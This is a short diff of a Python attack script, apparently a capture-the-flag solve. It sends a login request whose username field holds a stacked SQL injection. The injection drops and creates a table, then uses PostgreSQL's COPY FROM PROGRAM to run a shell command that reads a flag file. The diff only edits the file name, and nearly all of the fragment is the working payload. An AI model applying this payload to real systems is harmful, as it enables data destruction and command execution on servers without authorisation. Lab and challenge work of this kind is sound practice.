@@ -10,7 +10,7 @@ headers = {
 }
 
 burp_data = {
-        "username": f"admin'; DROP TABLE IF EXISTS abc; CREATE TABLE abc(aaa text); COPY abc FROM PROGRAM 'cat /flagXXXXX';--",
+        "username": f"admin'; DROP TABLE IF EXISTS abc; CREATE TABLE abc(aaa text); COPY abc FROM PROGRAM 'cat /flagXXXXX.txt';--",
         "password": "2" # XXXX: chỗ cần sửa
 }
 response = requests.post(burp_url, data=burp_data, headers=headers)
